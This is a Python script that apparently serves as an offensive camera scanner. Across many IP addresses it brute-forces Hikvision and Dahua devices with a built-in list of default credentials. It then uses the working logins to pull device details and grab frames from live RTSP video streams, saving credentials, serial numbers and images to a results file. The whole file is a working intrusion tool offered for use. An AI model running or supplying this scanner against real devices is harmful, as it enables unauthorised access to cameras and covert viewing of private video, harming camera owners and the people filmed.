#!/usr/bin/env python3
"""Quick camera scanner — credential test + RTSP stream extraction"""
import requests, subprocess, os, json, re, sys, time
from requests.auth import HTTPDigestAuth
from concurrent.futures import ThreadPoolExecutor, as_completed
requests.packages.urllib3.disable_warnings()

CREDS = [
    ('admin', '12345'), ('admin', '1111'), ('admin', '123456'),
    ('admin', 'admin'), ('admin', ''), ('admin', '1234'),
    ('root', 'pass'), ('root', '1234'), ('root', '123456'),
    ('666666', '666666'), ('888888', '888888'),
]

ENDPOINTS = [
    '/ISAPI/System/deviceInfo',
    '/cgi-bin/magicBox.cgi?action=getMachineName',
]

SIGS = ['hikvision', 'dahua', 'deviceinfo', 'devicename', 'machinename',
        'serialnumber', 'firmware', 'model', 'nvr', 'dvr', 'ipcamera',
        'onvif', 'devicetype', 'channelnumber', '<device']

RTSP_PATHS = [
    '/Streaming/Channels/101', '/Streaming/Channels/1', '/stream1',
    '/h264/ch1/main/av_stream', '/live/ch00_0',
]

def test_camera(ip):
    """Test one IP for camera credentials and RTSP stream"""
    found = None
    for port in [80, 8000]:
        if found:
            break
        for ep in ENDPOINTS:
            if found:
                break
            url = f'http://{ip}:{port}{ep}'
            for user, passwd in CREDS:
                if found:
                    break
                for auth_fn in [lambda u, p: HTTPDigestAuth(u, p), lambda u, p: (u, p)]:
                    try:
                        r = requests.get(url, auth=auth_fn(user, passwd), timeout=2.5, verify=False, allow_redirects=False)
                        if r.status_code == 200 and any(s in r.text.lower() for s in SIGS):
                            info = {'ip': ip, 'port': port, 'user': user, 'password': passwd, 'endpoint': ep}
                            # Extract device metadata
                            for tag in ['deviceName', 'model', 'serialNumber', 'firmwareVersion']:
                                m = re.search(f'<{tag}>(.*?)</{tag}>', r.text)
                                if m:
                                    info[tag] = m.group(1)
                            found = info
                            break
                    except:
                        pass

    if not found:
        return None

    # RTSP extraction
    user, passwd = found['user'], found['password']
    for rpath in RTSP_PATHS:
        rtsp_url = f'rtsp://{user}:{passwd}@{ip}:554{rpath}'
        frame = f'frames/frame_{ip.replace(".", "_")}.jpg'
        try:
            result = subprocess.run(
                ['ffmpeg', '-rtsp_transport', 'tcp', '-i', rtsp_url,
                 '-vframes', '1', '-f', 'image2', '-y', frame],
                capture_output=True, timeout=10
            )
            if result.returncode == 0 and os.path.exists(frame) and os.path.getsize(frame) > 1000:
                found['rtsp_url'] = rtsp_url
                found['rtsp_path'] = rpath
                found['frame_file'] = frame
                found['frame_size'] = os.path.getsize(frame)
                break
        except:
            pass
        if os.path.exists(frame) and os.path.getsize(frame) <= 1000:
            os.remove(frame)

    return found


if __name__ == '__main__':
    os.makedirs('frames', exist_ok=True)

    with open('cam_targets_dual.txt') as f:
        targets = [l.strip() for l in f if l.strip()]

    limit = int(sys.argv[1]) if len(sys.argv) > 1 else 80
    targets = targets[:limit]
    print(f'[*] Scanning {len(targets)} dual-port camera targets (554+8000)...')
    print(f'[*] Workers: 30 | Creds: {len(CREDS)} | RTSP paths: {len(RTSP_PATHS)}')

    results = []
    streams = []
    done = 0

    with ThreadPoolExecutor(max_workers=30) as pool:
        futures = {pool.submit(test_camera, ip): ip for ip in targets}
        for fut in as_completed(futures):
            done += 1
            ip = futures[fut]
            try:
                r = fut.result()
                if r:
                    results.append(r)
                    has_stream = 'rtsp_url' in r
                    model = r.get('model', r.get('deviceName', '?'))
                    tag = f'STREAM {r["frame_size"]}B' if has_stream else 'AUTH ONLY'
                    print(f'  [{done}/{len(targets)}] [+] {ip}:{r["port"]} | {r["user"]}:{r["password"]} | {model} | {tag}')
                    if has_stream:
                        streams.append(r)
            except Exception as e:
                pass

    print(f'\n{"="*70}')
    print(f'RESULTS: {len(results)} cameras authenticated, {len(streams)} with live RTSP streams')
    print(f'{"="*70}')

    for r in results:
        s = r.get('rtsp_url', 'N/A')
        m = r.get('model', r.get('deviceName', '?'))
        sn = r.get('serialNumber', '?')
        print(f'  {r["ip"]}:{r["port"]} | {r["user"]}:{r["password"]} | {m} | SN:{sn} | RTSP:{s}')

    with open('titan-x-live-results.json', 'w') as f:
        json.dump(results, f, indent=2)
    print(f'\nResults saved to titan-x-live-results.json')

    if streams:
        print(f'\nCaptured frames:')
        for s in streams:
            print(f'  {s["frame_file"]} ({s["frame_size"]} bytes)')
